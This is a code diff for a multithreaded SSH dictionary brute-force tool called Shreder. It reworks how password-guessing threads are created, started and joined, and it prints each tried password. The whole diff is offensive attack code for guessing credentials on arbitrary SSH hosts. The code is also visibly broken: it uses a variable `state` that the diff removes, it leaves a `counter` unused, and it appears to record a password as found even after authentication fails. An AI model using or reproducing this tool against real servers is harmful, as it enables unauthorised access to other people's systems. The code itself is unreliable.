@@ -40,22 +40,31 @@ class Shreder(Badges):
             ssh.connect(host, port=int(port), username=username, password=password)
         except paramiko.AuthenticationException:
             ssh.close()
+        print(password)
         self.password = password
 
     def brute(self, host, port, username, dictionary):
         with open(dictionary, 'r') as f:
-            state = 1
+            threads = list()
             lines = f.read().split('\n')
 
             for password in lines:
                 if password.strip() and not self.password:
-                    self.print_multi(f"Proceeding... ({str(state)}/{str(len(lines))})")
-
-                    thread = Thread(
-                        target=self.connect,
-                        args=[host, port, username, password]
+                    threads.append(
+                        Thread(
+                            target=self.connect,
+                            args=[host, port, username, password]
+                        )
                     )
-                    thread.start()
 
-                    state += 1
+            counter = 0
+            for thread in threads:
+                self.print_multi(f"Proceeding... ({str(state)}/{str(len(lines))})")
+                thread.start()
+
+                counter += 1
+            
+            for thread in threads:
+                thread.join()
+
         return self.password
